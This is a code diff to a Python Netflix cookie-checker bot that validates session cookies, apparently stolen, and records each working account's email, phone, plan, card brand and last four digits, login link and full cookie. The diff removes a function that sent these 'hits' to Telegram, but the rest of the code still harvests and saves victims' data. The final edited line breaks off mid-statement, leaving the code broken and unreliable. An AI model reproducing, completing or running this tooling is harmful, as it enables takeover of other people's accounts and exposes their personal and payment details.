@@ -142,27 +142,11 @@ class NetflixBulkChecker:
                     f.write("--- FULL COOKIE ---\n")
                     f.write(result['cookie'])
 
-                self.send_hit_to_telegram(result)
+                # Removed: self.send_hit_to_telegram(result)
                 print(f"\n{Fore.GREEN}[✓] HIT #{self.stats['hits']} Saved{Style.RESET_ALL}")
 
             else:
                 self.stats['bad'] += 1
-
-    def send_hit_to_telegram(self, result):
-        flag = self.get_country_flag(result.get('country_code', 'XX'))
-        msg = f"""
-🔥 <b>NETFLIX PREMIUM HIT #{self.stats['hits']}</b> 🔥
-
-👤 <b>Email:</b> <code>{result.get('email')}</code>
-🌍 <b>Country:</b> {result.get('country_code')} {flag}
-📋 <b>Plan:</b> {result.get('plan')}
-📅 <b>Next Billing:</b> {result.get('next_billing')}
-📞 <b>Phone:</b> {result.get('phone')}
-💳 <b>Card:</b> {result.get('card_brand')} •••• {result.get('last4')}
-👥 <b>Profiles:</b> {result.get('profiles')}
-💾 <b>Saved in hits folder</b>
-"""
-        self.send_telegram(msg)
 
     def start(self, folder):
         files = [os.path.join(root, f) for root, _, fs in os.walk(folder) for f in fs if f.endswith('.txt')]
@@ -237,29 +221,8 @@ def handle_direct_cookie(message):
     result = checker.check_cookie(text, "direct_chat")
 
     if result:
-        # Save to hits folder
         os.makedirs('hits', exist_ok=True)
         fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
         with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
             f.write(f"Email: {result['email']}\n")
-            f.write(f"Plan: {result['plan']}\n")
-            f.write(f"Country: {result['country_code']}\n")
-            f.write(f"Next Billing: {result['next_billing']}\n")
-            f.write(f"Phone: {result['phone']}\n")
-            f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
-            f.write(f"Profiles: {result['profiles']}\n")
-            f.write(f"Login URL: {result.get('login_url', 'N/A')}\n\n")
-            f.write("--- FULL COOKIE ---\n")
-            f.write(result['cookie'])
-
-        # Send login link
-        bot.reply_to(message, f"✅ **Login Link Ready**\n\n{result.get('login_url', 'N/A')}")
-        
-        checker.send_hit_to_telegram(result)
-    else:
-        bot.reply_to(message, "❌ Invalid or Dead Cookie")
-
-if __name__ == "__main__":
-    print("🚀 Netflix Cookie Checker Bot Started")
-    bot.remove_webhook()
-    bot.infinity_polling(skip_pending=True)
+            f.write(f"
